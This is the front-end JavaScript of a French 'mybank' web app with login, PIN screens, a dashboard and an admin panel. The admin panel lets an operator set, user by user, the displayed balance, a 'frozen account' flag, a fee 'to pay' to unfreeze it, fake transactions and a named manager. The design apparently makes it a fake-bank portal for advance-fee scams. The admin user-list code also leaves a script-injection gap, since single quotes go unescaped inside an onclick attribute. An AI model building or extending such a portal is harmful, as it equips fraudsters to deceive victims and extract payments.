// ========== ÉTAT AUTH ==========
let currentToken = localStorage.getItem('mybank_token') || null;
let currentUser = null;
let pinSetupValue = '';
let pinSetupStep = 'set'; // 'set' | 'confirm'
let pinSetupFirst = '';
let pinVerifyValue = '';
let selectedUserId = null;

function getAuthHeaders() {
  return { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + currentToken };
}

// ========== INIT AUTH AU CHARGEMENT ==========
async function initAuth() {
  if (!currentToken) {
    showAuthOverlay();
    showAuthScreen('screenLogin');
    return;
  }
  try {
    const r = await fetch('/api/auth/verify-token', {
      method: 'POST',
      headers: getAuthHeaders()
    });
    if (!r.ok) throw new Error('invalid');
    const data = await r.json();
    currentUser = { userId: data.userId, username: data.username, role: data.role };

    const pinOk = sessionStorage.getItem('mybank_pin_ok');
    if (!pinOk) {
      showAuthOverlay();
      document.getElementById('pinVerifyUsername').textContent = data.username;
      showAuthScreen('screenPinVerify');
    } else {
      hideAuthOverlay();
      onAuthenticated();
    }
  } catch {
    localStorage.removeItem('mybank_token');
    currentToken = null;
    showAuthOverlay();
    showAuthScreen('screenLogin');
  }
}

function showAuthOverlay() {
  document.getElementById('authOverlay').style.display = 'flex';
}
function hideAuthOverlay() {
  document.getElementById('authOverlay').style.display = 'none';
}

function showAuthScreen(id) {
  document.querySelectorAll('.auth-screen').forEach(s => s.classList.remove('active'));
  document.getElementById(id).classList.add('active');
}

// ========== CONNEXION ==========
async function doLogin() {
  const username = document.getElementById('loginUsername').value.trim();
  const password = document.getElementById('loginPassword').value;
  const errEl = document.getElementById('loginError');
  errEl.textContent = '';

  if (!username || !password) {
    errEl.textContent = 'Veuillez remplir tous les champs.';
    return;
  }

  try {
    const r = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
    const data = await r.json();
    if (!r.ok) { errEl.textContent = data.error || 'Erreur de connexion'; return; }

    currentToken = data.token;
    currentUser = { userId: data.userId, username: data.username, role: data.role };
    localStorage.setItem('mybank_token', currentToken);
    sessionStorage.setItem('mybank_pin_ok', '1');
    hideAuthOverlay();
    onAuthenticated();
  } catch {
    errEl.textContent = 'Erreur réseau. Réessayez.';
  }
}

// ========== INSCRIPTION ==========
function goToPinSetup() {
  const username = document.getElementById('regUsername').value.trim();
  const password = document.getElementById('regPassword').value;
  const confirm = document.getElementById('regPasswordConfirm').value;
  const errEl = document.getElementById('registerError');
  errEl.textContent = '';

  if (!username || !password || !confirm) {
    errEl.textContent = 'Veuillez remplir tous les champs.'; return;
  }
  if (username.length < 3) {
    errEl.textContent = 'Identifiant : 3 caractères minimum.'; return;
  }
  if (password.length < 4) {
    errEl.textContent = 'Mot de passe : 4 caractères minimum.'; return;
  }
  if (password !== confirm) {
    errEl.textContent = 'Les mots de passe ne correspondent pas.'; return;
  }

  pinSetupValue = '';
  pinSetupFirst = '';
  pinSetupStep = 'set';
  document.getElementById('pinSetupSubtitle').textContent = 'Définissez votre code PIN à 5 chiffres';
  updatePinDots('pinSetupDots', 0);
  document.getElementById('pinSetupError').textContent = '';
  showAuthScreen('screenPinSetup');
}

function pinSetupInput(digit) {
  if (pinSetupValue.length >= 5) return;
  pinSetupValue += digit;
  updatePinDots('pinSetupDots', pinSetupValue.length);

  if (pinSetupValue.length === 5) {
    setTimeout(() => {
      if (pinSetupStep === 'set') {
        pinSetupFirst = pinSetupValue;
        pinSetupValue = '';
        pinSetupStep = 'confirm';
        document.getElementById('pinSetupSubtitle').textContent = 'Confirmez votre code PIN';
        updatePinDots('pinSetupDots', 0);
        document.getElementById('pinSetupError').textContent = '';
      } else {
        if (pinSetupValue === pinSetupFirst) {
          doRegister(pinSetupValue);
        } else {
          document.getElementById('pinSetupError').textContent = 'Les codes PIN ne correspondent pas. Recommencez.';
          pinSetupValue = '';
          pinSetupFirst = '';
          pinSetupStep = 'set';
          document.getElementById('pinSetupSubtitle').textContent = 'Définissez votre code PIN à 5 chiffres';
          updatePinDots('pinSetupDots', 0);
        }
      }
    }, 150);
  }
}

function pinSetupDel() {
  if (pinSetupValue.length > 0) {
    pinSetupValue = pinSetupValue.slice(0, -1);
    updatePinDots('pinSetupDots', pinSetupValue.length);
  }
}

async function doRegister(pin) {
  const username = document.getElementById('regUsername').value.trim();
  const password = document.getElementById('regPassword').value;
  const errEl = document.getElementById('pinSetupError');

  try {
    const r = await fetch('/api/auth/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password, pin })
    });
    const data = await r.json();
    if (!r.ok) {
      errEl.textContent = data.error || 'Erreur lors de la création du compte.';
      pinSetupValue = '';
      pinSetupFirst = '';
      pinSetupStep = 'set';
      document.getElementById('pinSetupSubtitle').textContent = 'Définissez votre code PIN à 5 chiffres';
      updatePinDots('pinSetupDots', 0);
      showAuthScreen('screenRegister');
      document.getElementById('registerError').textContent = data.error || 'Erreur';
      return;
    }
    currentToken = data.token;
    currentUser = { userId: data.userId, username: data.username, role: data.role };
    localStorage.setItem('mybank_token', currentToken);
    sessionStorage.setItem('mybank_pin_ok', '1');
    hideAuthOverlay();
    onAuthenticated();
  } catch {
    errEl.textContent = 'Erreur réseau. Réessayez.';
  }
}

// ========== VÉRIFICATION PIN (retour) ==========
function pinVerifyInput(digit) {
  if (pinVerifyValue.length >= 5) return;
  pinVerifyValue += digit;
  updatePinDots('pinVerifyDots', pinVerifyValue.length);

  if (pinVerifyValue.length === 5) {
    setTimeout(() => doVerifyPin(), 150);
  }
}

function pinVerifyDel() {
  if (pinVerifyValue.length > 0) {
    pinVerifyValue = pinVerifyValue.slice(0, -1);
    updatePinDots('pinVerifyDots', pinVerifyValue.length);
  }
}

async function doVerifyPin() {
  const errEl = document.getElementById('pinVerifyError');
  errEl.textContent = '';
  const pin = pinVerifyValue;
  pinVerifyValue = '';
  updatePinDots('pinVerifyDots', 0);

  try {
    const r = await fetch('/api/auth/verify-pin', {
      method: 'POST',
      headers: getAuthHeaders(),
      body: JSON.stringify({ pin })
    });
    const data = await r.json();
    if (!r.ok) {
      errEl.textContent = data.error || 'Code PIN incorrect';
      shakeDots('pinVerifyDots');
      return;
    }
    sessionStorage.setItem('mybank_pin_ok', '1');
    hideAuthOverlay();
    onAuthenticated();
  } catch {
    errEl.textContent = 'Erreur réseau.';
  }
}

// ========== DÉCONNEXION ==========
function doLogout() {
  if (dataRefreshTimer) { clearInterval(dataRefreshTimer); dataRefreshTimer = null; }
  localStorage.removeItem('mybank_token');
  sessionStorage.removeItem('mybank_pin_ok');
  currentToken = null;
  currentUser = null;
  document.getElementById('loginUsername').value = '';
  document.getElementById('loginPassword').value = '';
  document.getElementById('loginError').textContent = '';
  showAuthOverlay();
  showAuthScreen('screenLogin');
}

// ========== UTILS PIN ==========
function updatePinDots(containerId, count) {
  const dots = document.querySelectorAll('#' + containerId + ' .pin-dot');
  dots.forEach((dot, i) => {
    dot.classList.toggle('filled', i < count);
  });
}

function shakeDots(containerId) {
  const container = document.getElementById(containerId);
  container.classList.add('shake');
  setTimeout(() => container.classList.remove('shake'), 500);
}

// ========== POST AUTH ==========
let dataRefreshTimer = null;

function onAuthenticated() {
  if (currentUser) {
    document.getElementById('settingsUsername').textContent = currentUser.username;
  }
  loadData();
  // Évite l'empilement d'intervalles (fix "tout vient deux fois")
  if (dataRefreshTimer) clearInterval(dataRefreshTimer);
  dataRefreshTimer = setInterval(loadData, 30000);
}

// ========== CHARGEMENT DONNÉES ==========
async function loadData() {
  try {
    const r = await fetch('/api/client-data', { headers: getAuthHeaders() });
    if (!r.ok) return;
    const data = await r.json();
    applyData(data);
  } catch (e) {
    console.log('Impossible de charger les données');
  }
}

function applyData(data) {
  if (data.alert_amount) {
    const amt = parseFloat(data.alert_amount).toLocaleString('fr-FR');
    document.getElementById('alertAmount').textContent = amt + ' €';
    const notifEl = document.getElementById('notifAlertText');
    if (notifEl) notifEl.textContent = 'Votre compte est temporairement gelé. Montant à payer : ' + amt + ' €';
  }
  if (data.account_number) document.getElementById('accountNumber').textContent = 'N° ' + data.account_number;
  if (data.account_date) document.getElementById('accountDate').textContent = data.account_date;
  if (data.account_balance) document.getElementById('mainBalance').textContent = parseFloat(data.account_balance).toLocaleString('fr-FR') + ' €';
  if (data.account_pending) document.getElementById('accountPending').textContent = parseFloat(data.account_pending).toLocaleString('fr-FR');
  document.getElementById('frozenBadge').style.display = (data.account_frozen === 'false') ? 'none' : '';
  document.getElementById('alertBanner').style.display = (data.account_frozen === 'false') ? 'none' : '';

  if (data.transaction1_name) document.getElementById('t1Name').textContent = data.transaction1_name;
  if (data.transaction1_date) document.getElementById('t1Date').textContent = data.transaction1_date;
  if (data.transaction1_status) document.getElementById('t1Status').textContent = data.transaction1_status;
  if (data.transaction1_amount) {
    const a = parseFloat(data.transaction1_amount);
    document.getElementById('t1Amount').textContent = a > 0 ? '−' + a.toLocaleString('fr-FR') + ' €' : 'Réglée';
  }
  if (data.transaction2_name) document.getElementById('t2Name').textContent = data.transaction2_name;
  if (data.transaction2_date) document.getElementById('t2Date').textContent = data.transaction2_date;
  if (data.transaction2_status) document.getElementById('t2Status').textContent = data.transaction2_status;
  if (data.transaction3_name) document.getElementById('t3Name').textContent = data.transaction3_name;
  if (data.transaction3_date) document.getElementById('t3Date').textContent = data.transaction3_date;
  if (data.transaction3_status) document.getElementById('t3Status').textContent = data.transaction3_status;

  if (data.synthese_total) document.getElementById('syntheseTotal').textContent = parseFloat(data.synthese_total).toLocaleString('fr-FR') + ' €';
  if (data.manager_name) {
    document.getElementById('managerName').textContent = data.manager_name;
    document.getElementById('contactManager').textContent = data.manager_name;
  }
  if (data.holder_lastname) document.getElementById('modalLastname').textContent = data.holder_lastname;
  if (data.holder_firstname) document.getElementById('modalFirstname').textContent = data.holder_firstname;
  if (data.holder_birthdate) document.getElementById('modalBirthdate').textContent = data.holder_birthdate;
  if (data.holder_country) document.getElementById('modalCountry').textContent = data.holder_country;
  if (data.holder_city) document.getElementById('modalCity').textContent = data.holder_city;
  if (data.holder_region) document.getElementById('modalRegion').textContent = data.holder_region;
  if (data.account_number) document.getElementById('modalAccountNumber').textContent = '**** **** ' + data.account_number.replace(/\*/g, '').trim();
  if (data.account_balance) {
    const bal = parseFloat(data.account_balance).toLocaleString('fr-FR');
    const frozen = data.account_frozen === 'true' ? ' (gelé)' : '';
    document.getElementById('modalBalance').textContent = bal + ' €' + frozen;
  }
  if (data.account_pending) document.getElementById('modalPending').textContent = parseFloat(data.account_pending).toLocaleString('fr-FR') + ' €';
  if (data.alert_amount) document.getElementById('modalAlert').textContent = parseFloat(data.alert_amount).toLocaleString('fr-FR') + ' € à payer';
  if (data.manager_name) document.getElementById('modalManager').textContent = data.manager_name;
  if (data.holder_firstname && data.holder_lastname) {
    const fullName = data.holder_firstname + ' ' + data.holder_lastname;
    document.getElementById('profileName').textContent = fullName;
    const ribEl = document.getElementById('ribName');
    if (ribEl) ribEl.textContent = fullName;
  }
}

// ========== PARAMÈTRES ==========
function openSettings() {
  const overlay = document.getElementById('settingsOverlay');
  overlay.style.display = 'flex';
  if (currentUser && currentUser.role === 'admin') {
    document.getElementById('settingsUser').style.display = 'none';
    document.getElementById('settingsAdmin').style.display = 'block';
    loadAdminUsers();
  } else {
    document.getElementById('settingsUser').style.display = 'block';
    document.getElementById('settingsAdmin').style.display = 'none';
  }
}

function closeSettings() {
  document.getElementById('settingsOverlay').style.display = 'none';
}

// ========== ADMIN ==========
function switchAdminTab(tab) {
  document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.admin-tab-content').forEach(t => t.classList.remove('active'));

  if (tab === 'users') {
    document.getElementById('tabUsers').classList.add('active');
    document.getElementById('adminTabUsers').classList.add('active');
  } else {
    document.getElementById('tabEdit').classList.add('active');
    document.getElementById('adminTabEdit').classList.add('active');
  }
}

async function loadAdminUsers() {
  const listEl = document.getElementById('adminUserList');
  listEl.innerHTML = '<p style="color:#888;font-size:13px;padding:16px;">Chargement…</p>';
  try {
    const r = await fetch('/api/admin/users', { headers: getAuthHeaders() });
    const users = await r.json();
    if (!Array.isArray(users) || users.length === 0) {
      listEl.innerHTML = '<p style="color:#888;font-size:13px;padding:16px;">Aucun utilisateur.</p>';
      return;
    }
    listEl.innerHTML = '';
    users.forEach(u => {
      const item = document.createElement('div');
      item.className = 'admin-user-item' + (u.id === selectedUserId ? ' selected' : '');
      const date = u.createdAt ? new Date(u.createdAt).toLocaleDateString('fr-FR') : '—';
      item.innerHTML = `
        <div class="admin-user-info">
          <span class="admin-user-name">${escapeHtml(u.username)}</span>
          <span class="admin-user-meta">${u.role === 'admin' ? '👑 Admin' : '👤 Titulaire'} · ${date}</span>
        </div>
        <button class="admin-user-edit-btn" onclick="selectUser('${u.id}','${escapeHtml(u.username)}')">Modifier ›</button>
      `;
      listEl.appendChild(item);
    });
  } catch {
    listEl.innerHTML = '<p style="color:#c0392b;font-size:13px;padding:16px;">Erreur de chargement.</p>';
  }
}

async function selectUser(userId, username) {
  selectedUserId = userId;
  document.getElementById('adminSelectedUsername').textContent = username;
  document.getElementById('adminSaveStatus').textContent = '';
  document.getElementById('adm_new_password').value = '';

  try {
    const r = await fetch('/api/admin/users/' + userId + '/data', { headers: getAuthHeaders() });
    const data = await r.json();
    const fields = ['alert_amount','account_number','account_date','account_balance','account_frozen',
      'account_pending','holder_lastname','holder_firstname','holder_birthdate','holder_country',
      'holder_city','holder_region','manager_name','transaction1_name','transaction1_date',
      'transaction1_status','transaction1_amount','transaction2_name','transaction2_date',
      'transaction2_status','transaction2_amount','transaction3_name','transaction3_date',
      'transaction3_status','transaction3_amount','synthese_total'];

    fields.forEach(key => {
      const el = document.getElementById('adm_' + key);
      if (el) {
        if (el.tagName === 'SELECT') el.value = data[key] || 'false';
        else el.value = data[key] || '';
      }
    });

    document.querySelectorAll('.admin-user-item').forEach(item => item.classList.remove('selected'));
    switchAdminTab('edit');
    loadAdminUsers();
  } catch {
    alert('Impossible de charger les données de cet utilisateur.');
  }
}

async function adminSaveData() {
  if (!selectedUserId) return;
  const statusEl = document.getElementById('adminSaveStatus');
  statusEl.textContent = '';
  statusEl.className = 'admin-save-status';

  const fields = ['alert_amount','account_number','account_date','account_balance','account_frozen',
    'account_pending','holder_lastname','holder_firstname','holder_birthdate','holder_country',
    'holder_city','holder_region','manager_name','transaction1_name','transaction1_date',
    'transaction1_status','transaction1_amount','transaction2_name','transaction2_date',
    'transaction2_status','transaction2_amount','transaction3_name','transaction3_date',
    'transaction3_status','transaction3_amount','synthese_total'];

  const updates = {};
  fields.forEach(key => {
    const el = document.getElementById('adm_' + key);
    if (el) updates[key] = el.value;
  });

  try {
    const r = await fetch('/api/admin/users/' + selectedUserId + '/data', {
      method: 'POST',
      headers: getAuthHeaders(),
      body: JSON.stringify(updates)
    });
    if (r.ok) {
      statusEl.textContent = '✅ Modifications enregistrées !';
      statusEl.className = 'admin-save-status success';
    } else {
      const d = await r.json();
      statusEl.textContent = '❌ ' + (d.error || 'Erreur');
      statusEl.className = 'admin-save-status error';
    }
  } catch {
    statusEl.textContent = '❌ Erreur réseau';
    statusEl.className = 'admin-save-status error';
  }
  setTimeout(() => { statusEl.textContent = ''; statusEl.className = 'admin-save-status'; }, 4000);
}

async function adminResetPassword() {
  if (!selectedUserId) return;
  const pw = document.getElementById('adm_new_password').value;
  if (!pw || pw.length < 4) { alert('Mot de passe : 4 caractères minimum.'); return; }
  if (!confirm('Réinitialiser le mot de passe de cet utilisateur ?')) return;
  try {
    const r = await fetch('/api/admin/users/' + selectedUserId + '/reset-password', {
      method: 'POST',
      headers: getAuthHeaders(),
      body: JSON.stringify({ newPassword: pw })
    });
    const d = await r.json();
    if (r.ok) { alert('✅ Mot de passe réinitialisé.'); document.getElementById('adm_new_password').value = ''; }
    else alert('❌ ' + (d.error || 'Erreur'));
  } catch { alert('Erreur réseau.'); }
}

async function adminDeleteUser() {
  if (!selectedUserId) return;
  const name = document.getElementById('adminSelectedUsername').textContent;
  if (!confirm('Supprimer définitivement le compte de "' + name + '" ?')) return;
  try {
    const r = await fetch('/api/admin/users/' + selectedUserId, {
      method: 'DELETE',
      headers: getAuthHeaders()
    });
    const d = await r.json();
    if (r.ok) {
      selectedUserId = null;
      document.getElementById('adminSelectedUsername').textContent = '—';
      switchAdminTab('users');
      loadAdminUsers();
      alert('✅ Compte supprimé.');
    } else alert('❌ ' + (d.error || 'Erreur'));
  } catch { alert('Erreur réseau.'); }
}

function escapeHtml(str) {
  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

// ========== NAVIGATION ==========
window.navigateTo = function(page) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  const target = document.getElementById('page-' + page);
  if (target) target.classList.add('active');
  document.querySelectorAll('.nav-item').forEach(item => {
    item.classList.remove('active');
    if (item.dataset.page === page) item.classList.add('active');
  });
  window.scrollTo(0, 0);
};

window.openModal = function(modalId) {
  const modal = document.getElementById(modalId);
  if (modal) { modal.classList.add('open'); document.body.style.overflow = 'hidden'; }
};
window.closeModal = function(modalId) {
  const modal = document.getElementById(modalId);
  if (modal) { modal.classList.remove('open'); document.body.style.overflow = ''; }
};

document.querySelectorAll('.modal-overlay').forEach(overlay => {
  overlay.addEventListener('click', e => {
    if (e.target === overlay) { overlay.classList.remove('open'); document.body.style.overflow = ''; }
  });
});

window.showVirement = () => openModal('virementModal');
window.showWero = () => alert('Wero : Fonctionnalité en cours de développement');
window.showRIB = () => openModal('ribModal');
window.showPlafonds = () => openModal('plafondsModal');
window.showNotifications = () => openModal('notifModal');
window.showAllAccounts = () => alert('Tous les comptes : Fonctionnalité en cours de développement');
window.showInsurance = () => alert('Assurances : Fonctionnalité en cours de développement');
window.showAllTransactions = () => alert('Toutes les opérations : Fonctionnalité en cours de développement');
window.showTransactionDetail = (id) => alert('Détail transaction ' + id + ' : Fonctionnalité en cours de développement');
window.showSynthese = () => alert('Synthèse complète : Fonctionnalité en cours de développement');
window.contactManager = () => alert('Contact gestionnaire : Fonctionnalité en cours de développement');
window.activateCashback = () => alert('Cashback activé !');
window.showOpportunities = () => alert('Opportunités : Fonctionnalité en cours de développement');
window.showImmobilier = () => alert('Crédit immobilier : Fonctionnalité en cours de développement');
window.showChat = () => alert('Messagerie : Fonctionnalité en cours de développement');
window.showPhone = () => { window.location.href = 'tel:+33140142000'; };
window.showSecurity = () => alert('Sécurité : Fonctionnalité en cours de développement');
window.showHelp = () => alert('Aide & Support : +33 1 40 14 20 00');
window.goBack = () => navigateTo('accueil');

// Balance toggle
document.addEventListener('DOMContentLoaded', () => {
  const toggleBtn = document.getElementById('toggleBalance');
  const balanceEl = document.getElementById('mainBalance');
  let shown = false;
  if (toggleBtn && balanceEl) {
    toggleBtn.addEventListener('click', () => {
      shown = !shown;
      balanceEl.classList.toggle('hidden', !shown);
    });
  }

  // Enter key on login
  document.getElementById('loginPassword').addEventListener('keydown', e => {
    if (e.key === 'Enter') doLogin();
  });
  document.getElementById('loginUsername').addEventListener('keydown', e => {
    if (e.key === 'Enter') document.getElementById('loginPassword').focus();
  });

  initAuth();
});

window.doLogin = doLogin;
window.goToPinSetup = goToPinSetup;
window.pinSetupInput = pinSetupInput;
window.pinSetupDel = pinSetupDel;
window.pinVerifyInput = pinVerifyInput;
window.pinVerifyDel = pinVerifyDel;
window.showAuthScreen = showAuthScreen;
window.doLogout = doLogout;
window.openSettings = openSettings;
window.closeSettings = closeSettings;
window.switchAdminTab = switchAdminTab;
window.selectUser = selectUser;
window.adminSaveData = adminSaveData;
window.adminResetPassword = adminResetPassword;
window.adminDeleteUser = adminDeleteUser;
